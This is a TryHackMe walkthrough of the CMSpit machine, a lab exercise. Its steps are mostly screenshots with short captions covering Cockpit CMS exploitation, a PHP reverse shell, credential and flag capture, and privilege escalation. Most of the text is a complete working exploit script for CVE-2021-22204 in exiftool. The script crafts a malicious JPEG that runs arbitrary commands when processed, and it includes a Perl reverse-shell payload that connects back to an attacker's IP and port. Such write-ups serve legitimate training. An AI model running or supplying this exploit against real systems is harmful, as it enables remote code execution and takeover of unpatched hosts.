---
title: "CMSpit Walkthrough & Writeup — TryHackMe"
published: true
description: "Paso a paso detallado para resolver la maquina CMSpit en TryHackMe: reconocimiento, analisis, explotacion y escalada de privilegios."
tags: cybersecurity, ctf, tryhackme, pentesting
series: "TryHackMe Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_01.png"
---

cockpit

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_01.png)

version

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_02.png)

link 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_03.png)

exploit cockpit

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_04.png)

users and skidy information

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_05.png)

webflag

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_06.png)

initial access revshell php

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_08.png)

password de stux and flag db

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_09.png)

user.txt

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_10.png)

search escalate privilege 

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_11.png)

search exploit exiftool

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_12.png)

[exploit-CVE-2021-22204.py](http://exploit-cve-2021-22204.py/)

```powershell
#!/usr/bin/env python3



import base64

import os

import subprocess

import sys



class color:

    red = '\033[91m'

    gold = '\033[93m'

    blue = '\033[36m'

    green = '\033[92m'

    no = '\033[0m'





def help():

    print(r"""UNICORD Exploit for CVE-2021-22204

Usage:

  python3 exploit-CVE-2021-22204.py -c <command>

  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>

  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]

  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]

  python3 exploit-CVE-2021-22204.py -h

Options:

  -c    Custom command mode. Provide command to execute.

  -s    Reverse shell mode. Provide local IP and port.

  -i    Path to custom JPEG image. (Optional)

  -h    Show this help menu.

""")



def exploit(command):

    # Create perl payload

    payload = '(metadata "\\c${' + command + '};")'

    print(color.red + "RUNNING: " + color.blue + "UNICORD Exploit for CVE-2021-22204" + color.no)

    print(color.red + "PAYLOAD: " + color.gold + payload + color.no)

    # Write payload to file

    payloadFile = open('payload', 'w')

    payloadFile.write(payload)

    payloadFile.close()

    # Bzz compress file

    subprocess.run(['bzz', 'payload', 'payload.bzz'])

    # Run djvumake

    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])

    if '-i' in sys.argv:

        imagePath = sys.argv[sys.argv.index('-i') + 1]

        subprocess.run(['cp', imagePath, './image.jpg', '-n'])

    else:

        # Smallest possible JPEG

        image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="

        # Write smallest possible JPEG image to file

        with open("image.jpg", "wb") as img:

            img.write(base64.decodebytes(image))

    # Write exiftool config to file

    config = (r"""

    %Image::ExifTool::UserDefined = (

    'Image::ExifTool::Exif::Main' => {

        0xc51b => {

            Name => 'HasselbladExif',

            Writable => 'string',

            WriteGroup => 'IFD0',

        },

    },

    );

    1; #end

    """)

    configFile = open('exiftool.config', 'w')

    configFile.write(config)

    configFile.close()

    # Exiftool config for output image

    subprocess.run(['exiftool', '-config', 'exiftool.config', '-HasselbladExif<=exploit.djvu', 'image.jpg', '-overwrite_original_in_place', '-q'])

    # Delete leftover files

    os.remove("payload")

    os.remove("payload.bzz")

    os.remove("exploit.djvu")

    os.remove("exiftool.config")

    # Print results

    print(color.red + "RUNTIME: " + color.green + "DONE - Exploit image written to 'image.jpg'" + color.no + "\n")

    exit()

if __name__ == "__main__":

    args = ['-h', '-c', '-s', '-i']

    if args[0] in sys.argv:

        help()

    elif args[1] in sys.argv and not args[2] in sys.argv:

        exec = sys.argv[sys.argv.index(args[1]) + 1]

        command = "system('{}')".format(exec)

        exploit(command)

    elif args[2] in sys.argv and not args[1] in sys.argv:

        localIP = sys.argv[sys.argv.index(args[2]) + 1]

        localPort = sys.argv[sys.argv.index(args[2]) + 2]

        command = "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({},inet_aton('{}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".format(localPort, localIP)

        exploit(command)

    else:

        help()

```

Root.txt

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_13.png)